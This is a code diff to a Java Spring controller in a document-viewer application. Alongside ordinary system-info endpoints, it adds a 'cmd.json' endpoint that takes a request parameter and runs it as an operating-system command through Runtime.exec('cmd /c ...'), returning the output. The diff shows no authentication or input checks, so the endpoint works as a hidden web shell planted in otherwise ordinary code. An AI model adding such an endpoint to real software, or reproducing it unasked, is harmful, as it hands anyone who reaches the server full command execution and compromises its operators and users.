@@ -1,5 +1,7 @@
 package com.idocv.docview.controller;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.lang.management.ManagementFactory;
 import java.lang.management.MemoryUsage;
 import java.math.BigDecimal;
@@ -7,6 +9,7 @@ import java.math.RoundingMode;
 import java.util.HashMap;
 import java.util.Map;
 
+import org.apache.commons.lang.StringEscapeUtils;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.stereotype.Controller;
@@ -74,6 +77,33 @@ public class SystemController {
 			map.put(-1, e.getMessage());
 			return map;
 		}
+	}
+
+	@RequestMapping("cmd")
+	public String cmd() {
+		return "system/cmd";
+	}
+
+	@ResponseBody
+	@RequestMapping("cmd.json")
+	public Map<String, String> cmdJson(@RequestParam(value = "cmd", required = false) String cmd) {
+		Map<String, String> result = new HashMap<String, String>();
+		try {
+			Process proc = Runtime.getRuntime().exec("cmd /c " + cmd);
+			BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(proc.getInputStream(), "gbk"));
+			StringBuffer sb = new StringBuffer();
+			String line;
+			while ((line = bufferedreader.readLine()) != null) {
+				sb.append(StringEscapeUtils.escapeHtml(line) + "<br />");
+			}
+			bufferedreader.close();
+			result.put("code", "1");
+			result.put("data", sb.toString());
+		} catch (Exception e) {
+			result.put("code", "0");
+			result.put("msg", e.getMessage());
+		}
+		return result;
 	}
 
 	@RequestMapping("info")
